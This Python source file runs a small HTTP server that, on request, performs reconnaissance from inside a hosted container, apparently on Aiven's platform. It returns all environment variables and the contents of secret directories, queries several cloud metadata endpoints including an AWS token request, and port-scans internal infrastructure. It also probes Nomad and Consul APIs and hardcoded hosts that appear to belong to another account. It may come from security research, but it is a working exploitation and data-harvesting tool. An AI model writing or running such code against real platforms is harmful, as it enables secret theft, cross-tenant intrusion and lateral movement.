import http.server
import json
import os
import platform
import re
import socket
import ssl
import subprocess
import urllib.request
from pathlib import Path


def try_read(path, limit=2000):
    try:
        with open(path, "r", errors="replace") as f:
            return f.read(limit)
    except Exception as e:
        return f"<error reading: {e}>"


def try_run(cmd, timeout=3):
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return (out.stdout + out.stderr).strip()[:3000]
    except Exception as e:
        return f"<error running {cmd}: {e}>"


def try_reach(url, timeout=2, headers=None):
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(500)
            return {"reachable": True, "status": resp.status, "body_snippet": body.decode(errors="replace")}
    except Exception as e:
        return {"reachable": False, "error": str(e)}


def tcp_connect(host, port, timeout=1.5):
    try:
        family = socket.AF_INET6 if ":" in host else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return {"open": True}
    except Exception as e:
        return {"open": False, "error": str(e)}


def http_get_raw(host, port, path="/", timeout=2, use_https=False, extra_headers=""):
    try:
        family = socket.AF_INET6 if ":" in host else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect_host = f"[{host}]" if family == socket.AF_INET6 else host
        s.connect((host, port))
        if use_https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s)
        req = f"GET {path} HTTP/1.1\r\nHost: {connect_host}\r\nConnection: close\r\n{extra_headers}\r\n"
        s.sendall(req.encode())
        data = b""
        while len(data) < 4000:
            chunk = s.recv(4000)
            if not chunk:
                break
            data += chunk
        s.close()
        return {"ok": True, "response_snippet": data.decode(errors="replace")[:2000]}
    except Exception as e:
        return {"ok": False, "error": str(e)}


ACCOUNT_A_REFERENCE_HOSTS = [
    "fda7:a938:5bfe:5fa6:0:5df:921c:bd78",
    "fda7:a938:5bfe:5fa6:0:5df:7da0:83f",
    "fda7:a938:5bfe:5fa6:0:5df:91f5:6851",
    "fda7:a938:5bfe:5fa6:0:5df:dbf5:263",
    "fda7:a938:5bfe:5fa6:0:5dd:a5bf:5e98",
    "fda7:a938:5bfe:5fa6:0:5df:c92:9552",
]

PROBE_PORTS = [4646, 4647, 8500, 8300, 80, 443, 8080, 22]
DEEP_PORTS = sorted(set(PROBE_PORTS + [
    4648, 8600, 2375, 2376, 2379, 2380, 6443, 10250, 10255, 4194,
    9100, 9090, 9093, 3000, 8200, 9216, 9419, 7001, 7946, 4789, 53, 123, 25, 587
]))
LOCAL_PORTS = [22, 80, 443, 8080, 8443, 9090, 9100, 4646, 4647, 8500, 8300, 8200, 2379, 2380, 10250]
NOMAD_PATHS = [
    "/v1/agent/self",
    "/v1/agent/members",
    "/v1/agent/health",
    "/v1/status/leader",
    "/v1/status/peers",
    "/v1/operator/autopilot/health",
    "/v1/metrics",
    "/v1/nodes",
    "/v1/jobs",
    "/v1/acl/token/self",
    "/v1/namespaces",
]


def parse_infra_hosts_from_etc_hosts():
    hosts = []
    text = try_read("/etc/hosts", 20000)
    if text.startswith("<error"):
        return hosts, text
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"\s+", line)
        if len(parts) < 2:
            continue
        ip, names = parts[0], parts[1:]
        if any("aiven-application-infrastructure.aiven.local" in n for n in names):
            hosts.append({"ip": ip, "names": names})
    return hosts, text


def probe_hosts(hosts, ports=None):
    ports = ports or PROBE_PORTS
    results = {}
    for host in hosts:
        host_result = {}
        for port in ports:
            r = tcp_connect(host, port)
            host_result[str(port)] = r
            if r.get("open") and port in (4646, 8500):
                path = "/v1/agent/members" if port == 4646 else "/v1/catalog/nodes"
                host_result[f"{port}_http_probe"] = http_get_raw(
                    host, port, path=path, use_https=(port == 4646)
                )
        results[host] = host_result
    return results


def find_open_nomad_host(host_results):
    for host, ports in host_results.items():
        if ports.get("4646", {}).get("open"):
            return host
    return None


def test_nomad_api(host, port=4646):
    results = {"target_host": host, "target_port": port, "endpoints": {}}
    if not host:
        results["error"] = "no open Nomad HTTP host found"
        return results
    for path in NOMAD_PATHS:
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ss = ctx.wrap_socket(s)
            req = f"GET {path} HTTP/1.1\r\nHost: [{host}]\r\nConnection: close\r\n\r\n"
            ss.sendall(req.encode())
            data = b""
            while len(data) < 8000:
                chunk = ss.recv(8000)
                if not chunk:
                    break
                data += chunk
            cipher = None
            try:
                cipher = ss.cipher()
            except Exception:
                pass
            ss.close()
            results["endpoints"][path] = {
                "ok": True,
                "tls_cipher": cipher,
                "response_snippet": data.decode(errors="replace")[:4000],
            }
        except Exception as e:
            results["endpoints"][path] = {"ok": False, "error": str(e)}
    return results


def probe_localhost():
    results = {"127.0.0.1": {}, "::1": {}}
    for port in LOCAL_PORTS:
        results["127.0.0.1"][str(port)] = tcp_connect("127.0.0.1", port, timeout=0.8)
        results["::1"][str(port)] = tcp_connect("::1", port, timeout=0.8)
    return results


def list_tree(path, max_entries=80, max_file=1500):
    out = {"path": path, "exists": os.path.exists(path), "entries": []}
    if not out["exists"]:
        return out
    try:
        names = sorted(os.listdir(path))[:max_entries]
    except Exception as e:
        out["error"] = str(e)
        return out
    for name in names:
        full = os.path.join(path, name)
        item = {"name": name, "is_dir": os.path.isdir(full), "is_file": os.path.isfile(full)}
        try:
            item["size"] = os.path.getsize(full)
        except Exception:
            pass
        if item["is_file"] and item.get("size", 0) <= max_file:
            item["content"] = try_read(full, max_file)
        elif item["is_dir"]:
            try:
                item["children"] = sorted(os.listdir(full))[:40]
            except Exception as e:
                item["children_error"] = str(e)
        out["entries"].append(item)
    return out


def parse_proc_net(path):
    """Return listening sockets from /proc/net/tcp{,6}."""
    text = try_read(path, 200000)
    if text.startswith("<error"):
        return {"error": text}
    listeners = []
    lines = text.splitlines()[1:]
    for line in lines:
        parts = line.split()
        if len(parts) < 4:
            continue
        local, state = parts[1], parts[3]
        # state 0A = LISTEN
        if state != "0A":
            continue
        ip_hex, port_hex = local.split(":")
        port = int(port_hex, 16)
        listeners.append({"raw_local": local, "port": port, "state": state, "uid": parts[7] if len(parts) > 7 else None})
    return {"listeners": listeners, "line_count": len(lines)}


def dns_lookup(name):
    out = {"name": name}
    try:
        out["getaddrinfo"] = []
        for fam, typ, proto, canon, sockaddr in socket.getaddrinfo(name, None):
            out["getaddrinfo"].append({"family": fam, "sockaddr": sockaddr, "canon": canon})
    except Exception as e:
        out["error"] = str(e)
    return out


def deep_dive():
    infra, hosts_text = parse_infra_hosts_from_etc_hosts()
    local_ips = [h["ip"] for h in infra]
    local_scan = probe_hosts(local_ips, ports=PROBE_PORTS)
    open_host = find_open_nomad_host(local_scan)

    # Hostnames from /etc/hosts for non-infra interesting targets
    interesting_targets = []
    for line in hosts_text.splitlines():
        parts = re.split(r"\s+", line.strip())
        if len(parts) >= 2 and not line.strip().startswith("#"):
            interesting_targets.append({"ip": parts[0], "names": parts[1:]})

    data = {
        "filesystem": {
            "secrets": list_tree("/secrets"),
            "run_secrets": list_tree("/run/secrets"),
            "alloc": list_tree("/alloc"),
            "local": list_tree("/local"),
            "containerenv": try_read("/run/.containerenv"),
            "proc_self_environ_keys": sorted(
                [l.split("=", 1)[0] for l in try_read("/proc/self/environ", 20000).replace("\x00", "\n").splitlines() if l]
            ),
            "proc_self_cwd": try_run(["readlink", "/proc/self/cwd"]),
            "proc_self_exe": try_run(["readlink", "/proc/self/exe"]),
            "proc_self_mountinfo": try_read("/proc/self/mountinfo", 6000),
            "proc_self_uid_map": try_read("/proc/self/uid_map"),
            "proc_self_gid_map": try_read("/proc/self/gid_map"),
            "proc_self_status_caps": try_run(
                ["sh", "-c", "grep -E '^(Uid|Gid|Cap|NSpid|NoNewPrivs|Seccomp)' /proc/self/status"]
            ),
        },
        "listeners": {
            "tcp": parse_proc_net("/proc/net/tcp"),
            "tcp6": parse_proc_net("/proc/net/tcp6"),
        },
        "dns": {
            "resolv_conf": try_read("/etc/resolv.conf"),
            "infra_lookups": [dns_lookup(h["names"][0]) for h in infra if h.get("names")],
            "special_lookups": [
                dns_lookup("host.containers.internal"),
                dns_lookup("host.docker.internal"),
                dns_lookup("kubernetes.default.svc.cluster.local"),
                dns_lookup("consul.service.consul"),
                dns_lookup("nomad.service.consul"),
            ],
        },
        "local_infra_hosts": infra,
        "local_infra_scan_basic": local_scan,
        "open_nomad_host_deep_ports": probe_hosts([open_host], ports=DEEP_PORTS) if open_host else None,
        "nomad_api_extended": test_nomad_api(open_host) if open_host else None,
        "neighbor_targets_scan": {},
        "safety_note": "read-only connect/GET only; no SSH auth; no Nomad writes; no RPC 4647 protocol",
    }

    # Probe interesting neighbor IPs/ports lightly
    neighbor_hosts = []
    for t in interesting_targets:
        ip = t["ip"]
        if ip in ("127.0.0.1", "::1"):
            continue
        if ip.startswith("fda7:") and "aiven-application-infrastructure" in " ".join(t["names"]):
            continue  # already covered
        neighbor_hosts.append(ip)
    # Always include link-local / pod helpers
    for h in ["169.254.1.1", "169.254.1.2", "169.254.169.254", "host.containers.internal"]:
        if h not in neighbor_hosts:
            neighbor_hosts.append(h)
    neighbor_ports = [22, 53, 80, 443, 8080, 8443, 4646, 4647, 8500, 8300, 2375, 2376, 10250, 9100]
    data["neighbor_targets_scan"] = probe_hosts(neighbor_hosts, ports=neighbor_ports)

    # Account A reference quick check (ports that mattered)
    data["account_a_reference_quick"] = probe_hosts(ACCOUNT_A_REFERENCE_HOSTS, ports=[4646, 22])
    return data


def gather_diagnostics():
    data = {}
    data["hostname"] = socket.gethostname()
    try:
        data["fqdn"] = socket.getfqdn()
    except Exception as e:
        data["fqdn"] = str(e)
    try:
        data["local_ips"] = socket.gethostbyname_ex(socket.gethostname())
    except Exception as e:
        data["local_ips"] = str(e)

    data["platform"] = platform.platform()
    data["kernel_release"] = platform.release()
    data["machine"] = platform.machine()
    data["env"] = dict(os.environ)

    data["proc_self_cgroup"] = try_read("/proc/self/cgroup")
    data["proc_1_cgroup"] = try_read("/proc/1/cgroup")
    data["dockerenv_exists"] = os.path.exists("/.dockerenv")
    data["containerenv_exists"] = os.path.exists("/run/.containerenv")
    data["proc_self_mountinfo"] = try_read("/proc/self/mountinfo", 4000)
    data["proc_self_uid_map"] = try_read("/proc/self/uid_map")
    data["proc_self_gid_map"] = try_read("/proc/self/gid_map")
    data["proc_self_status_caps"] = try_run(
        ["sh", "-c", "grep -E '^(Uid|Gid|Cap|NSpid|NoNewPrivs)' /proc/self/status"]
    )

    data["ip_addr"] = try_run(["ip", "addr"]) if os.path.exists("/usr/sbin/ip") or os.path.exists("/sbin/ip") else try_run(["ifconfig"])
    data["ip_route"] = try_run(["ip", "route"])
    data["resolv_conf"] = try_read("/etc/resolv.conf")
    infra, hosts_text = parse_infra_hosts_from_etc_hosts()
    data["hosts_file"] = hosts_text
    data["infra_hosts_parsed"] = infra

    data["whoami"] = try_run(["whoami"])
    data["id"] = try_run(["id"])
    data["uname_a"] = try_run(["uname", "-a"])
    data["cpuinfo_model"] = try_run(["sh", "-c", "grep 'model name' /proc/cpuinfo | head -1"])
    data["meminfo_total"] = try_run(["sh", "-c", "grep MemTotal /proc/meminfo"])

    data["aws_metadata_v1"] = try_reach("http://169.254.169.254/latest/meta-data/", timeout=2)
    data["aws_metadata_v2_token"] = try_reach(
        "http://169.254.169.254/latest/api/token",
        timeout=2,
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
    )
    data["gcp_metadata"] = try_reach(
        "http://169.254.169.254/computeMetadata/v1/",
        timeout=2,
        headers={"Metadata-Flavor": "Google"},
    )
    data["azure_metadata"] = try_reach(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        timeout=2,
        headers={"Metadata": "true"},
    )
    data["digitalocean_metadata"] = try_reach("http://169.254.169.254/metadata/v1/", timeout=2)

    data["k8s_sa_token_exists"] = os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token")
    data["k8s_namespace"] = try_read("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
    data["kubernetes_service_host_env"] = os.environ.get("KUBERNETES_SERVICE_HOST")
    return data


class Handler(http.server.BaseHTTPRequestHandler):
    def _json(self, data, code=200):
        body = json.dumps(data, indent=2, default=str).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        try:
            if self.path.startswith("/deep"):
                self._json(deep_dive())
                return
            if self.path.startswith("/localhost-probe"):
                self._json(probe_localhost())
                return
            if self.path.startswith("/probe-internal"):
                infra, _ = parse_infra_hosts_from_etc_hosts()
                local_ips = [h["ip"] for h in infra]
                data = {
                    "local_infra_hosts": infra,
                    "local_infra_scan": probe_hosts(local_ips),
                    "account_a_reference_scan": probe_hosts(ACCOUNT_A_REFERENCE_HOSTS),
                }
                self._json(data)
                return
            if self.path.startswith("/nomad-api-test"):
                infra, _ = parse_infra_hosts_from_etc_hosts()
                local_ips = [h["ip"] for h in infra]
                local_scan = probe_hosts(local_ips)
                host = find_open_nomad_host(local_scan)
                source = "local_infra"
                if not host:
                    ref_scan = probe_hosts(ACCOUNT_A_REFERENCE_HOSTS)
                    host = find_open_nomad_host(ref_scan)
                    source = "account_a_reference" if host else "none"
                data = {
                    "selected_host_source": source,
                    "local_infra_open_4646": {
                        h: p.get("4646") for h, p in local_scan.items() if p.get("4646", {}).get("open")
                    },
                    "nomad_api": test_nomad_api(host),
                }
                self._json(data)
                return
            self._json(gather_diagnostics())
        except Exception as e:
            self._json({"error": str(e)}, code=500)

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "8080"))
    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    print(f"listening on 0.0.0.0:{port}", flush=True)
    server.serve_forever()
